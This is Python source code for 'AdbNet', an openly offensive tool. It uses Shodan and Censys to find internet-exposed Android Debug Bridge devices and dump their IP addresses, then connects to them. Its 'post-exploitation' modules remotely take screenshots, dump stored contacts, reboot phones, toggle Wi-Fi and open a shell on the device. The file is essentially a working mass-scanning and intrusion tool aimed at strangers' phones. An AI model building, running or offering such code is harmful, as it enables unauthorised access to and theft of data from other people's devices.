try: 
    import os
    import re
    import socket
    import pathlib
    import requests
    import subprocess
    from time import sleep
    from colorama import Fore
    from datetime import datetime
except:
    print("[-] Error! Make sure you install the required modules!")


shodan_key = "" # Add your Shodan API Key here
api_id = "" # Add your Censys API ID here
api_secret = "" # Add your Censys API Secret Key here


# AdbNet
# Date: 07/06/21
# Author: https://github.com/0x1CA3


cur = datetime.now()
clear_screen = lambda: os.system("cls" if os.name == "nt" else "clear")
current_time = cur.strftime("%m/%d/%Y, %H:%M:%S")
leave = lambda: exit()
computer_name = socket.gethostname()

class other():
    def help_menu():
        helpmain = f""" 
        {Fore.GREEN}Commands                            Description
        {Fore.GREEN}--------                            -----------
        {Fore.RED}help                                Displays help commands.
        {Fore.RED}info                                Lets you retrieve information on a specified device.
        {Fore.RED}post                                Loads post-exploitation modules for connected android devices.
        {Fore.RED}shell                               Lets you execute a system command.
        {Fore.RED}banner                              Displays the banner.
        {Fore.RED}other                               Displays other/extra commands.
        {Fore.RED}clear                               Clears the screen.
        {Fore.RED}exit                                Exits.
        
        {Fore.GREEN}ADB Options [Remote-Access]         Description
        {Fore.GREEN}-----------                         -----------
        {Fore.RED}adb                                 Lets you execute your own custom commands for ADB.
        {Fore.RED}install                             Installs ADB if you don't already have it installed.
        {Fore.RED}connect                             Lets you connect to a specific device.
        {Fore.RED}devices                             Lists the devices YOU are currently connected to.
        {Fore.RED}command                             Lets you execute a command without opening a shell.
        {Fore.RED}terminal                            Opens up a shell. [Use the 'exit' command to return back to the Framework]
        {Fore.RED}killall                             Kills all sessions.
       
        {Fore.GREEN}Scanner Options                     Description
        {Fore.GREEN}---------------                     -----------
        {Fore.RED}scan shodan                         Uses shodan to search for vulnerable devices. [This is the default scanner]
        {Fore.RED}scan censy                          Uses censys to search for vulnerable devices.
        """
        print(helpmain)

    def banner():
        clear_screen()
        a = requests.get(f'''https://api.shodan.io/shodan/host/count?key={shodan_key}&query=android+debug+bridge''').text
        clea = a.replace('''{"matches": [], "total":''', '')
        cleanr = clea.replace('''}''', '')
        banr = f"""
            {Fore.RED} ▄▄▄      ▓█████▄  ▄▄▄▄       ███▄    █ ▓█████▄▄▄█████▓    {Fore.GREEN}[+] Logged in as: {computer_name}
            {Fore.RED}▒████▄    ▒██▀ ██▌▓█████▄     ██ ▀█   █ ▓█   ▀▓  ██▒ ▓▒    {Fore.GREEN}[+] Devices available:{cleanr}
            {Fore.RED}▒██  ▀█▄  ░██   █▌▒██▒ ▄██   ▓██  ▀█ ██▒▒███  ▒ ▓██░ ▒░    {Fore.GREEN}[+] Time: {current_time}
            {Fore.RED}░██▄▄▄▄██ ░▓█▄   ▌▒██░█▀     ▓██▒  ▐▌██▒▒▓█  ▄░ ▓██▓ ░     {Fore.GREEN}[+] Made by: https://github.com/0x1CA3
            {Fore.RED} ▓█   ▓██▒░▒████▓ ░▓█  ▀█▓   ▒██░   ▓██░░▒████▒ ▒██▒ ░     {Fore.GREEN}[+] The most common ports are 5555 and 4444!
            {Fore.RED} ▒▒   ▓▒█░ ▒▒▓  ▒ ░▒▓███▀▒   ░ ▒░   ▒ ▒ ░░ ▒░ ░ ▒ ░░       {Fore.GREEN}[+] Use 'help' or '?' for commands!
            {Fore.RED}  ▒   ▒▒ ░ ░ ▒  ▒ ▒░▒   ░    ░ ░░   ░ ▒░ ░ ░  ░   ░    
            {Fore.RED}  ░   ▒    ░ ░  ░  ░    ░       ░   ░ ░    ░    ░      
            {Fore.RED}      ░  ░   ░     ░                  ░    ░  ░        
            {Fore.RED}           ░            ░                              
        """
        print(banr)
    
    def help_other():
        otherhelp = f"""
        {Fore.GREEN}Dump Options                        Description
        {Fore.GREEN}------------                        -----------
        {Fore.RED}dump shodan                         Attempts to dump IP addresses of the vulnerable devices. [Shodan]
        {Fore.RED}dump censy                          Attempts to dump IP addresses of the vulnerable devices. [Censy]
        """
        print(otherhelp)

    def post_help():
        helppost = f"""
        [Reminder: Make sure you are already connected to a device! You can check if you are by using the 'devices' command.]
        
        {Fore.GREEN}Post-Exploitation-Modules                          Description
        {Fore.GREEN}-------------------------                          -----------
        {Fore.RED}battery                                            Retrieves the devices battery information.
        {Fore.RED}net_enable                                         Enables Wi-Fi remotely on the device.
        {Fore.RED}net_disable                                        Disables Wi-Fi remotely on the device.
        {Fore.RED}screenshot                                         Takes a screenshot remotely on the device.
        {Fore.RED}reboot                                             Remotely reboots the device.
        {Fore.RED}dump_contacts                                      Remotely dumps the stored contacts on the device.
        {Fore.RED}dump_activity                                      Retrieves the phones activity.
        """
        print(helppost)
    
    def terminal():
        while True:
            term = input(f"{Fore.GREEN}({pathlib.Path().resolve()})-[user@terminal]~# ")
            if term == "back" or term == "exit": cli()
            else: os.system(f"{term}")

    def adb_terminal():
        while True:
            adb_term = input(f"{Fore.GREEN}({pathlib.Path().resolve()})-[user@adb]~# ")
            if adb_term == "back" or adb_term == "exit": cli()
            else: os.system(f"adb {adb_term}")

    def fetch_device_ip():
        os.system("python extra/fetch.py > extra/ip.txt")
        os.system("python3 extra/fetch.py > extra/ip.txt")
        fetchipfile = open("extra/ip.txt", "r")
        datafetch = fetchipfile.readlines()
        print(f"{Fore.GREEN}[+] Attempting to dump data...")
        sleep(0.10)
        for line in datafetch:
            if "ip_str" or "host" in line:
                print(f'''{Fore.GREEN}[+] Fetched information!
                --------------------------------
                {line}''')
            else:
                print(f"{Fore.RED}[-] Error! Could not fetch IP addresses!")

    def censys_scan_device():
        if os.name == "nt":
            os.system(f'''curl -G 'https://search.censys.io/api/v2/hosts/search' --data-urlencode "q='Android Debug Bridge'" -u {api_id}:{api_secret}''')
        else:
            os.system(f'''curl -G 'https://search.censys.io/api/v2/hosts/search' --data-urlencode "q='Android Debug Bridge'" -u {api_id}:{api_secret} | jq '.' > extra/data.json''')
            censydata = open("extra/data.json", "r")
            datext = censydata.readlines()
            for line in datext:
                if "total" in line:
                    cenip = line
                    cenipclean = cenip.replace('''"''', '')
                    cencleanerip = cenipclean.replace(":", '')
                    cenclenfinal = cencleanerip.replace(",", '')
                    censuperipclean = re.sub('[a-z]', '', cenclenfinal)
                    print(f"\n{Fore.GREEN}[+] Devices available: " + censuperipclean)
    
    def censys_dump_ip():
        if os.name == "nt":
            os.system(f'''curl -G 'https://search.censys.io/api/v2/hosts/search' --data-urlencode "q='Android Debug Bridge'" -u {api_id}:{api_secret}''')
        else:
            os.system(f'''curl -G 'https://search.censys.io/api/v2/hosts/search' --data-urlencode "q='Android Debug Bridge'" -u {api_id}:{api_secret} | jq '.' > extra/data.json''')
            censydata = open("extra/data.json", "r")
            datext = censydata.readlines()
            for line in datext:
                if "ip" in line:
                    cenip1 = line
                    cenipclean1 = cenip1.replace('''"''', '')
                    cencleanerip1 = cenipclean1.replace(":", '')
                    cenclenfinal1 = cencleanerip1.replace(",", '')
                    censuperipclean1 = re.sub('[a-z]', '', cenclenfinal1)
                    print(f"{Fore.GREEN}[+] IP Address dumped! -" + censuperipclean1)

class handler():
    def __init__(self, command):
        self.shell = command

    def device_check_shodan():
        print("Checking devices...")
        sleep(0.5)
        a = requests.get(f'''https://api.shodan.io/shodan/host/count?key={shodan_key}&query=android+debug+bridge''').text
        clean = a.replace('''{"matches": [], "total":''', '')
        cleaner = clean.replace('''}''', '')
        print(f"{Fore.GREEN}\n[+]{cleaner} Devices available!\n")
    
    cmds = \
        {
            "help": other.help_menu,
            "?": other.help_menu,
            "dump shodan": other.fetch_device_ip,
            "dump censy": other.censys_dump_ip,
            "clear": clear_screen,
            "post": other.post_help,
            "shell": other.terminal,
            "scan shodan": device_check_shodan,
            "scan censy": other.censys_scan_device,
            "banner": other.banner,
            "other": other.help_other,
            "exit": leave,
            "adb": other.adb_terminal
        }
    
    postexp = \
        {
            "battery": "adb shell dumpsys battery",
            "net_enable": "adb shell svc wifi enable",
            "net_disable": "adb shell svc wifi disable",
            "screenshot": "adb shell screencap /sdcard/sspwned.png",
            "reboot": "adb reboot",
            "dump_contacts": "adb shell content query --uri content://contacts/phones/  --projection display_name:number",
            "dump_activity": "adb shell dumpsys activity"
        }
    
    adb_cmds = \
        {
            "install": "sudo apt install adb",
            "devices": "adb devices",
            "terminal": "adb shell",
            "killall": "adb kill-server"
        }

    def device_information(android_device):
        print("Fetching information on device...")
        sleep(0.5)
        try: 
            b = requests.get(f'''https://api.shodan.io/shodan/host/{android_device}?key={shodan_key}''')
            print(f"{Fore.GREEN}[+] Information Fetched!")
            print(b.text)
        except:
            print(f"{Fore.RED}[-] Failed to retrieve information about the specified device!")

    def extra_run(self):
        if self.shell == "info": 
            android_device = input(f"{Fore.GREEN}({pathlib.Path().resolve()})-[Enter an IP]~# ")
            handler.device_information(android_device)
        elif self.shell == "connect":
            adb_connect = input(f"{Fore.GREEN}({pathlib.Path().resolve()})-[Enter an IP]~# ")
            adb_port = input(f"{Fore.GREEN}({pathlib.Path().resolve()})-[Enter a Port]~# ")
            print("[+] Starting...")
            sleep(0.4)
            os.system(f"adb connect {adb_connect}:{adb_port}")
        elif self.shell == "command":
            adb_command = input(f"{Fore.GREEN}({pathlib.Path().resolve()})-[Enter a command]~# ")
            os.system(f"adb shell {adb_command}")
        else:
            print(f"{Fore.RED}Error! Command [{self.shell}] was not found!")
    
    def cmd(self, cmds=cmds, adb_cmds=adb_cmds, postexp=postexp):
        if self.shell in cmds:
            try:
                cmds[self.shell]()
            except:
                print(f"{Fore.RED}[-] Failed to properly execute command!")
        elif self.shell in adb_cmds:
            try:
                subprocess.call(adb_cmds[self.shell], shell=True)
            except:
                print(f"{Fore.RED}[-] Failed to properly execute command!")
        elif self.shell in postexp:
            try:
                subprocess.call(postexp[self.shell], shell=True)
            except:
                print(f"{Fore.RED}[-] Failed to properly execute command!")
        else:
            handler.extra_run(self)

def cli():
    while True:
        shell = handler(input(f"{Fore.GREEN}({pathlib.Path().resolve()})-[user@adbnet]~# "))
        shell.cmd()

if __name__ == "__main__":
    try:
        other.banner()
        cli()
    except KeyboardInterrupt as interrupt:
        exit(interrupt)